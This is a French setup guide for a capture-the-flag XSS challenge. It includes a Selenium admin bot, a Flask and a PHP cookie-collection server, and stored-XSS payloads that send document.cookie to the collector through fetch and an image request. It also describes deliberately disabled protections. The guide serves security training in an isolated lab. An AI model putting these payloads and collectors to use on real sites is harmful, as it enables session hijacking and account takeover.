# Guide de Simulation Bot - Challenge XSS Cookie Theft

## Challenge 3: Community Takeover (Titouan)
**Difficulté**: ★★★★★  
**Points**: 500  
**Vulnérabilités**: Stored XSS + Cookie sans HttpOnly

---

## Objectif du Bot

Le bot Selenium simule un administrateur qui visite régulièrement les pages de jeux pour modérer les avis. Lorsqu'un attaquant injecte du code JavaScript malveillant dans un avis, le bot exécute ce code et expose son cookie de session.

## Architecture

```
┌─────────────────┐
│   Attacker      │
│  (POST XSS)     │
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│   game.php      │◄───────┐
│ (Stored XSS)    │        │
└────────┬────────┘        │
         │                 │
         ▼                 │
┌─────────────────┐        │
│  Selenium Bot   │────────┘
│  (Admin User)   │   Visite périodique
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│ Cookie Stealer  │
│   (Attacker)    │
└─────────────────┘
```

---

## Configuration Requise

### 1. Serveur de Collecte (Cookie Stealer)

Créer un serveur simple qui reçoit les cookies volés:

**Option A - Python (Recommandé)**
```python
# cookie_stealer.py
from flask import Flask, request
import datetime

app = Flask(__name__)

@app.route('/steal')
def steal_cookie():
    cookie = request.args.get('cookie', 'No cookie')
    ip = request.remote_addr
    timestamp = datetime.datetime.now()
    
    print(f"\n{'='*60}")
    print(f"🚩 COOKIE VOLÉ!")
    print(f"{'='*60}")
    print(f"Timestamp: {timestamp}")
    print(f"IP: {ip}")
    print(f"Cookie: {cookie}")
    print(f"{'='*60}\n")
    
    # Sauvegarder dans un fichier
    with open('stolen_cookies.txt', 'a') as f:
        f.write(f"[{timestamp}] {ip}: {cookie}\n")
    
    return "OK", 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8888)
```

**Lancer le serveur:**
```bash
pip install flask
python cookie_stealer.py
```

**Option B - PHP Simple**
```php
<?php
// steal.php
$cookie = $_GET['cookie'] ?? 'No cookie';
$ip = $_SERVER['REMOTE_ADDR'];
$timestamp = date('Y-m-d H:i:s');

$log = "[$timestamp] $ip: $cookie\n";
file_put_contents('stolen_cookies.txt', $log, FILE_APPEND);

echo "OK";
?>
```

---

### 2. Bot Selenium

**Installation:**
```bash
pip install selenium webdriver-manager
```

**Code du Bot (bot_admin.py):**
```python
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.chrome.options import Options
import time

# Configuration
CHTIM_URL = "http://localhost/Chtim"
ADMIN_USERNAME = "admin_bot"
ADMIN_PASSWORD = "super_secret_admin_2025"
GAMES_TO_VISIT = [1, 2, 3, 4, 5]
VISIT_INTERVAL = 60  # secondes

def setup_driver():
    """Configure le navigateur Chrome"""
    options = Options()
    # options.add_argument('--headless')  # Décommenter pour mode invisible
    options.add_argument('--no-sandbox')
    options.add_argument('--disable-dev-shm-usage')
    
    service = Service(ChromeDriverManager().install())
    driver = webdriver.Chrome(service=service, options=options)
    return driver

def login_as_admin(driver):
    """Se connecte en tant qu'administrateur"""
    print("🔑 Connexion en tant qu'admin...")
    driver.get(f"{CHTIM_URL}/index.php")
    time.sleep(2)
    
    try:
        # Remplir le formulaire de connexion
        username_field = driver.find_element(By.NAME, "username")
        password_field = driver.find_element(By.NAME, "password")
        
        username_field.send_keys(ADMIN_USERNAME)
        password_field.send_keys(ADMIN_PASSWORD)
        
        # Soumettre
        login_button = driver.find_element(By.CSS_SELECTOR, "button[type='submit']")
        login_button.click()
        
        time.sleep(3)
        print("✅ Connexion réussie!")
        return True
    except Exception as e:
        print(f"❌ Erreur de connexion: {e}")
        return False

def visit_game_reviews(driver, game_id):
    """Visite la page d'un jeu (où le XSS peut se déclencher)"""
    print(f"👁️  Visite de la page du jeu #{game_id}...")
    driver.get(f"{CHTIM_URL}/game.php?id={game_id}")
    time.sleep(5)  # Laisser le temps au JavaScript de s'exécuter

def bot_loop():
    """Boucle principale du bot"""
    driver = setup_driver()
    
    try:
        # Connexion initiale
        if not login_as_admin(driver):
            print("Impossible de se connecter. Arrêt du bot.")
            return
        
        print(f"\n🤖 Bot actif! Visite des jeux toutes les {VISIT_INTERVAL}s")
        print("Press Ctrl+C to stop\n")
        
        cycle = 0
        while True:
            cycle += 1
            print(f"\n{'='*60}")
            print(f"Cycle #{cycle}")
            print(f"{'='*60}")
            
            for game_id in GAMES_TO_VISIT:
                visit_game_reviews(driver, game_id)
                time.sleep(2)
            
            print(f"\n⏳ Attente de {VISIT_INTERVAL}s avant le prochain cycle...")
            time.sleep(VISIT_INTERVAL)
            
    except KeyboardInterrupt:
        print("\n\n🛑 Arrêt du bot...")
    finally:
        driver.quit()
        print("Bot arrêté.")

if __name__ == "__main__":
    bot_loop()
```

---

## Utilisation

### Étape 1: Lancer le Serveur de Collecte
```bash
python cookie_stealer.py
# Serveur écoute sur http://0.0.0.0:8888
```

### Étape 2: Lancer le Bot Selenium
```bash
python bot_admin.py
# Le bot se connecte et visite les jeux toutes les 60s
```

### Étape 3: Injecter le Payload XSS

Se connecter en tant qu'utilisateur normal et poster un avis sur un jeu:

**Payload XSS de base:**
```html
<script>alert(document.cookie)</script>
```

**Payload de vol de cookie:**
```html
<script>
fetch('http://localhost:8888/steal?cookie=' + encodeURIComponent(document.cookie));
</script>
```

**Payload avancé (avec exfiltration):**
```html
<script>
var img = new Image();
img.src = 'http://localhost:8888/steal?cookie=' + document.cookie + '&user=' + '<?php echo $_SESSION["username"]; ?>';
</script>
```

### Étape 4: Attendre la Visite du Bot

Le bot visite automatiquement les pages de jeux. Lorsqu'il charge la page contenant votre XSS:
1. Le script s'exécute dans le contexte du bot (admin)
2. Le cookie de session est envoyé à votre serveur
3. Vous récupérez le flag: **`FLAG{XSS_COOKIE_THEFT_MASTER}`**

---

## Vérification

### Vérifier que les cookies sont accessibles:
Ouvrir la console navigateur sur `game.php`:
```javascript
console.log(document.cookie);
// Devrait afficher: PHPSESSID=abc123...
```

### Tester manuellement le XSS:
1. Poster un avis avec: `<img src=x onerror="alert('XSS')">`
2. Recharger la page
3. L'alerte devrait s'afficher

---

## Flags

- **Flag pour XSS simple**: Visible en exécutant `<script>alert('FLAG{STORED_XSS_FOUND}')</script>`
- **Flag pour vol de cookie**: `FLAG{XSS_COOKIE_THEFT_MASTER}` (affiché dans les logs du serveur de collecte)

---

## Notes de Sécurité

⚠️ **IMPORTANT**: Ce setup est UNIQUEMENT pour un environnement CTF isolé!

**Mesures de protection (à NE PAS implémenter pour le challenge):**
- Utiliser `htmlspecialchars()` sur le contenu des avis
- Activer `HttpOnly` sur les cookies de session
- Implémenter CSP (Content Security Policy)
- Valider et sanitizer toutes les entrées utilisateur

---

## Dépannage

**Problème: Le bot ne se connecte pas**
- Vérifier que l'utilisateur `admin_bot` existe dans la base de données
- Vérifier l'URL dans `CHTIM_URL`

**Problème: Le cookie n'est pas volé**
- Vérifier que le serveur de collecte est accessible depuis le bot
- Vérifier les règles de pare-feu
- Essayer avec `http://127.0.0.1:8888` au lieu de `localhost`

**Problème: XSS ne s'exécute pas**
- Vérifier que `htmlspecialchars()` n'est PAS appliqué sur le contenu des avis
- Vérifier dans le code source HTML que le script est bien présent

---

## Diagramme de Flux

```
1. Attaquant → POST avis avec XSS → Base de données
2. Bot Admin → GET game.php → Affiche avis (XSS exécuté)
3. XSS → document.cookie → Envoie à serveur attaquant
4. Attaquant → Reçoit cookie admin → FLAG obtenu!
```
